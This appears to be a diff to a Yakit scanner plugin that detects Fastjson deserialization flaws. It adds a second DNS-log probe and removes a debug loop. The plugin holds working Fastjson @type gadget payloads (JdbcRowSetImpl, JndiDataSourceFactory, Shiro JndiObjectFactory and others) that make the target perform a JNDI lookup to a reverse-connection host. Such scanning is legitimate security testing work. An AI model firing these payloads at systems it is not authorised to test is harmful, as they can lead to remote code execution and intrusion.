@@ -12,7 +12,7 @@ __test__ = func() {
 }
 
 highVersionPayload = [`{"{{randstr(2)}}":{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"{{params(reverseConnTarget)}}"}}`,`{"{{randstr(2)}}":{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"{{params(reverseConnTarget)}}"}}`,`{"{{randstr(2)}}":{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"{{params(reverseConnTarget)}}"}`,`{"{{randstr(2)}}":{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"{{params(reverseConnTarget)}}"}}}`]
-dnslogPayload = `{"{{randstr(2)}}":{"@type":"java.net.Inet4Address","val":"{{params(reverseConnTarget)}}"}}`
+dnslogPayloads = [`{"{{randstr(2)}}":{"@type":"java.net.InetSocketAddress"{"address":,"val":"{{params(reverseConnTarget)}}"}}}`,`{"{{randstr(2)}}":{"@type":"java.net.Inet4Address","val":"{{params(reverseConnTarget)}}"}}`]
 nextPayload = [`{"{{randstr(2)}}":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"{{randstr(2)}}":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"{{params(reverseConnTarget)}}","autoCommit":true}}`,`{"@type":"[com.sun.rowset.JdbcRowSetImpl"[,,,{,,,"dataSourceName":"{{params(reverseConnTarget)}}", "autoCommit":true}`]
 
 
@@ -39,13 +39,6 @@ subTask = func() {
 }
 
 mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
-    go fn(){
-        for {
-
-            yakit_output("test")
-            time.Sleep(1)
-        }
-    }()
     addTask()
     defer subTask()
     defer func {
@@ -114,15 +107,17 @@ mirrorNewWebsitePath = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rs
             }
             return false
         }
-        if testPayload(genPayload(dnslogPayload,domain)){
-            riskLevel = "middle"
-            for _,payloadRaw = range nextPayload{
-                if testPayload(genPayload(payloadRaw,reverseConnTarget)){
-                    riskLevel = "critical"
-                    return true
+        for _,dnslogPayload = range dnslogPayloads{
+            if testPayload(genPayload(dnslogPayload,domain)){
+                riskLevel = "middle"
+                for _,payloadRaw = range nextPayload{
+                    if testPayload(genPayload(payloadRaw,reverseConnTarget)){
+                        riskLevel = "critical"
+                        return true
+                    }
                 }
+                return true
             }
-            return true
         }
         for _,payloadRaw = range highVersionPayload{
             if testPayload(genPayload(payloadRaw,reverseConnTarget)){
